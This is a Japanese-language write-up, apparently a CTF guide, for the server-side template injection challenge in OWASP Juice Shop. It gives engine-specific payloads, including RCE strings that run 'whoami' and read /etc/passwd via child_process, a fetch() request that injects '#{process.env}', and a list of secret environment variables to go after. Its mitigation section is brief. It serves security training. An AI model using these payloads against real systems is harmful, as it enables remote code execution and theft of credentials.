# SSTi ❌

**難易度:** ⭐⭐⭐⭐⭐⭐
**カテゴリ:** Server-Side Template Injection
**目標:** テンプレートインジェクションでサーバー情報を取得

---

## 思考プロセス

**ステップ1: SSTI の基本を理解**
```
「テンプレートエンジン = 動的コンテンツ生成」
    ↓
「ユーザー入力がテンプレートに挿入される」
    ↓
「テンプレート構文を注入すると、サーバー側で実行される」
    ↓
「変数アクセス、メソッド呼び出し、コード実行が可能」
```

**ステップ2: Juice Shop のテンプレートエンジン**
```
「Juice Shop は Node.js + Express」
    ↓
「テンプレートエンジン: Pug (旧 Jade) または EJS」
    ↓
「Pug の構文: #{expression}」
    ↓
「#{process.env} で環境変数にアクセスできる？」
```

**ステップ3: 入力箇所を探す**
```
「テンプレートに挿入されるユーザー入力を探す」
    ↓
「プロフィール名？フィードバック？」
    ↓
「レンダリングされる箇所に #{} を注入」
```

## テンプレートエンジン別の構文

| エンジン | 構文 | 例 |
|---------|------|-----|
| Pug/Jade | `#{expr}` | `#{7*7}` |
| EJS | `<%= expr %>` | `<%= 7*7 %>` |
| Nunjucks | `{{ expr }}` | `{{ 7*7 }}` |
| Handlebars | `{{ expr }}` | `{{ this }}` |

## テスト用ペイロード

```
# 数式（どのエンジンでも動く基本テスト）
#{7*7}
${7*7}
{{7*7}}
<%= 7*7 %>

# 結果が 49 になれば SSTI 成功

# Node.js 特有
#{process.env}
#{process.version}
#{process.cwd()}
#{global}

# RCE (Remote Code Execution)
#{require('child_process').execSync('whoami')}
#{require('child_process').execSync('cat /etc/passwd')}
```

## 実行手順

1. **SSTI 脆弱な入力箇所を探す**
   - プロフィールの名前/ユーザー名
   - フィードバックのコメント
   - 商品レビュー
   - メールアドレス（確認メールに使用される場合）

2. **基本テストを実行**
   ```
   入力: #{7*7}
   出力: 49 → SSTI 成功
   出力: #{7*7} → SSTI 失敗（エスケープされている）
   ```

3. **環境変数の取得を試行**
   ```javascript
   // プロフィール更新でテスト
   fetch('/api/Users/1', {
     method: 'PUT',
     headers: {
       'Content-Type': 'application/json',
       'Authorization': 'Bearer ' + localStorage.getItem('token')
     },
     body: JSON.stringify({
       username: '#{process.env}'
     })
   }).then(r => r.json()).then(console.log);
   ```

4. **確認ページにアクセス**
   - ユーザー名が表示されるページを確認
   - 環境変数が展開されていれば成功

## 環境変数の重要情報

```
process.env.NODE_ENV      - 環境（production/development）
process.env.DATABASE_URL  - データベース接続文字列
process.env.JWT_SECRET    - JWT 署名シークレット
process.env.AWS_ACCESS_KEY_ID - AWS 認証情報
process.env.GOOGLE_API_KEY - Google API キー
```

## 検証ポイント

- [ ] テンプレートエンジンの種類を特定
- [ ] 入力がテンプレートに挿入される箇所を発見
- [ ] 基本ペイロード `#{7*7}` でテスト
- [ ] `#{process.env}` で環境変数を取得

## 対策

- ユーザー入力を直接テンプレートに挿入しない
- サンドボックス化されたテンプレートエンジンを使用
- 入力のサニタイズ（`#`, `{`, `}` などのエスケープ）
- テンプレートのコンパイルとレンダリングを分離

## 関連チャレンジ

- [XXE Data Access](../difficulty-3/xxe-data-access.md) - サーバー側インジェクション
- [API-only XSS](../difficulty-3/api-only-xss.md) - XSS

## 解説

[未着手]
